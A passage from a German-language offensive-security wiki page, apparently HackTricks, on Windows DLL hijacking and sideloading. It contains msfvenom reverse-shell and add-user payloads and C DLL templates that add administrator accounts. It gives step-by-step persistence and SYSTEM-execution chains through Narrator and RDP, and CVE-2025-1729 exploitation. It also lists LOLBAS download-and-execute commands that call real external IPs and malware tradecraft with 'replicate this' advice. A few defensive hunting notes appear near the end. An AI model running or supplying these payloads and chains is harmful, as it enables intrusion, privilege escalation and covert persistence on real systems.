```
**Einen Meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Deine eigene

Beachte, dass die DLL, die du kompilierst, in mehreren Fällen **mehrere Funktionen exportieren** muss, die vom Opferprozess geladen werden. Wenn diese Funktionen nicht existieren, kann die **Binary sie nicht laden** und der **Exploit schlägt fehl**.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++-DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization-DLL, die für beliebige Codeausführung und Persistenz gehijackt werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Probe-Pfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exporte sind nicht erforderlich.

Discovery mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und den Ladeversuch für den oben genannten Pfad beobachten.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC-Silence
- Ein naiver Hijack würde die Benutzeroberfläche aktivieren oder hervorheben. Um unauffällig zu bleiben, enumeriere beim Attach die Narrator-Threads, öffne den Hauptthread (`OpenThread(THREAD_SUSPEND_RESUME)`) und halte ihn mit `SuspendThread` an; fahre in deinem eigenen Thread fort. Siehe PoC für den vollständigen Code.<sup>[[8]](#references)</sup>

Auslösung und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt das Starten von Narrator die platzierte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsschicht zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Stelle eine RDP-Verbindung zum Host her und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, sobald die RDP-Sitzung geschlossen wird – injiziere oder migriere daher umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen Registry-Eintrag eines integrierten Accessibility Tools (AT) klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf ein beliebiges Binary bzw. eine beliebige DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework vermittelt.

Hinweise
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` enthalten sein; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** im Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), registriert als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details der Schwachstelle

- **Komponente**: `TPQMAssistant.exe`, befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Berechtigungen des Verzeichnisses**: Für `CREATOR OWNER` beschreibbar, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Es wird zunächst versucht, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden. Fehlt sie, wird "NAME NOT FOUND" protokolliert, was auf eine Vorrangigkeit der Suche im lokalen Verzeichnis hindeutet.

### Exploit-Implementierung

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei der Ausführung der Aufgabe ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität ausgeführt.
4. Kombiniere standardmäßige UAC bypass techniques, um von mittlerer Integrität zu SYSTEM privileges zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors kombinieren häufig MSI-basierte droppers mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Übersicht der Kette
- Der Benutzer lädt eine MSI-Datei herunter. Eine CustomAction wird während der GUI-Installation unbemerkt ausgeführt (z. B. eine LaunchApplication- oder VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows DLL search order zuerst wsc.dll aus dem Arbeitsverzeichnis und führt dadurch Angreifercode unter einem signierten parent aus (ATT&CK T1574.001).

MSI-Analyse (wonach zu suchen ist)
- CustomAction-Tabelle:
- Suche nach Einträgen, die Executables oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
- Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/aufgeteilte payloads im MSI-CAB:
- Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder verwende lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction zusammengefügt und entschlüsselt werden. Üblicher Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand ihres Namens aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine bestimmten Exporte erforderlich sind, reicht DllMain aus. Andernfalls erstelle eine Proxy-DLL und leite die erforderlichen Exporte an die genuine Bibliothek weiter, während der Payload in DllMain ausgeführt wird.
- Erstelle einen minimalen DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwenden Sie ein Proxying-Framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die zusätzlich Ihr Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binary. Wenn der Host absolute Pfade oder sichere Lade-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binary und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** einsetzt, um sich in legitime Software einzufügen und gleichzeitig das Kern-Payload auf der Festplatte verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, damit sie wie eine Windows-Binary aussieht (beispielsweise `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Malicious loader DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise eine mit dem ScatterBrain-Framework obfuskierte MFC-Binary. Ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu mappen.
3. **Encrypted payload blob** – wird häufig als `<name>.tmp` im selben Verzeichnis gespeichert. Nach dem Memory-Mapping des entschlüsselten Payloads löscht der Loader die TMP-Datei, um forensische Beweise zu vernichten.

Tradecraft-Hinweise:

* Das Umbenennen der signierten EXE (während `OriginalFileName` im PE-Header erhalten bleibt) ermöglicht es, sie als Windows-Binary zu tarnen und gleichzeitig die Signatur des Anbieters beizubehalten. Übernehmen Sie daher Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die tatsächlich AMD/NVIDIA-Utilities sind.
* Da die ausführbare Datei vertrauenswürdig bleibt, müssen die meisten Allowlisting-Kontrollen lediglich Ihre Malicious DLL neben ihr vorfinden. Konzentrieren Sie sich auf die Anpassung der Loader-DLL; der signierte Parent kann normalerweise unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass der TMP-Blob neben dem Loader liegt und beschreibbar ist, damit die Datei nach dem Mapping auf null gesetzt werden kann. Lassen Sie das Verzeichnis beschreibbar, bis das Payload geladen wurde; sobald es sich im Speicher befindet, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatoren kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die Malicious DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und piped sie an `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus, sodass Operatoren den Second-Stage-Server serverseitig wechseln können.

- **Integriertes Download/Extrahieren:** Laden Sie ein Archiv mit einer harmlosen Erweiterung herunter, entpacken Sie es und stellen Sie das Sideload-Ziel samt DLL unter einem zufälligen `%LocalAppData%`-Ordner bereit:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` blendet den Fortschritt aus und folgt Redirects; `tar -xf` verwendet das in Windows integrierte tar.

- **WMI/CIM-Start:** Starten Sie die EXE über WMI, sodass die Telemetrie einen durch CIM erstellten Prozess zeigt, während dieser die nebenliegende DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Lösen Sie einen Alert für `forfiles` aus, wenn `/p`, `/m` und `/c` gemeinsam auftreten; außerhalb von Admin-Skripten ist dies ungewöhnlich.


## Fallstudie: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Ein jüngster Lotus-Blossom-Einbruch missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper bereitzustellen, der ein DLL sideloading sowie vollständig im Speicher befindliche Payloads vorbereitete.<sup>[[13]](#references)</sup>

Tradecraft-Ablauf
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine Malicious `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Daten frei und springt dorthin.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Export-Namen mithilfe von **FNV-1a basis 0x811C9DC5 + prime 0x100019** hasht, anschließend eine Murmur-artige Avalanche (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Main-Modul, indem über fünf Durchläufe wiederholt Add/XOR/Sub mit dem Schlüssel `gQ2JR&9;` ausgeführt wird, und lädt anschließend dynamisch `Kernel32.dll` → `GetProcAddress`, um die Import-Auflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mithilfe von Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Konfiguration befindet sich innerhalb der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons erstellen ein punktgetrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend mit dem Schlüssel `vAuig34%^325hGV` per RC4, bevor `HttpSendRequestA` über HTTPS aufgerufen wird. Antworten werden per RC4 entschlüsselt und über einen Tag-Switch verteilt (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Installation der Persistenz (service/Run key), die auf `-i` zeigt; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Alternate loader observed
- Derselbe Einbruch legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, wobei sich `libtcc.dll` daneben befand. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Speicher ausgeführt, ohne eine PE auf der Festplatte abzulegen. Replizieren Sie dies mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese auf TCC basierende Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud Shellcode der zweiten Phase von einer fest codierten URL herunter, wodurch ein flexibler Loader entstand, der sich als Compilerlauf tarnt.

## Signed-host sideloading with export proxying + host thread parking

Einige DLL-sideloading-Ketten fügen **Stabilitätsmechanismen** hinzu, damit der legitime Host lange genug aktiv bleibt, um spätere Phasen sauber zu laden, anstatt nach dem Laden der schädlichen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer schädlichen DLL mit dem erwarteten Abhängigkeitsnamen wie `version.dll` ablegen.
- Die schädliche DLL **proxt jeden erwarteten Export** an die echte System-DLL weiter, beispielsweise `%SystemRoot%\\System32\\version.dll`, sodass die Importauflösung weiterhin erfolgreich ist und der Host-Prozess funktionsfähig bleibt.
- Nach dem Laden patcht die schädliche DLL den Entry Point des Hosts, sodass der Hauptthread in eine Endlosschleife mit `Sleep` fällt, anstatt zu beenden oder Codepfade auszuführen, die den Prozess beenden würden.
- Ein neuer Thread führt die eigentliche schädliche Arbeit aus: den Namen oder Pfad der DLL der nächsten Phase entschlüsseln (RC4/XOR sind üblich) und sie anschließend mit `LoadLibrary` laden.

Warum das wichtig ist
- Normales DLL-Proxying bewahrt die API-Kompatibilität, garantiert jedoch nicht, dass der Host lange genug aktiv bleibt, damit spätere Phasen geladen werden können.
- Das Parken des Hauptthreads in `Sleep(INFINITE)` ist eine einfache Methode, um den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder den Netzwerk-Bootstrap durchführt.
- Wenn nur nach einem verdächtigen `DllMain` gesucht wird, kann dieses Muster übersehen werden, wenn das interessante Verhalten erst nach dem Patchen des Host-Entry-Points und dem Start eines sekundären Threads auftritt.

Minimaler Workflow
1. Die signierte Host-EXE kopieren und die DLL ermitteln, die sie aus dem lokalen Verzeichnis auflöst.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und sie an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Entry-Point oder die Start-Routine des Hauptthreads patchen, sodass sie in einer `Sleep`-Schleife läuft.
5. Den Namen/die Konfiguration der DLL der nächsten Phase entschlüsseln und `LoadLibrary` aufrufen oder das Payload manuell mappen.

Defensive Ansatzpunkte
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Prozess-Entry-Point kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erstellt werden und unmittelbar `LoadLibrary` für eine zweite DLL mit einem entschlüsselten Namen aufrufen.
- Proxy-DLLs mit vollständigem Export-Satz, die neben Hersteller-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
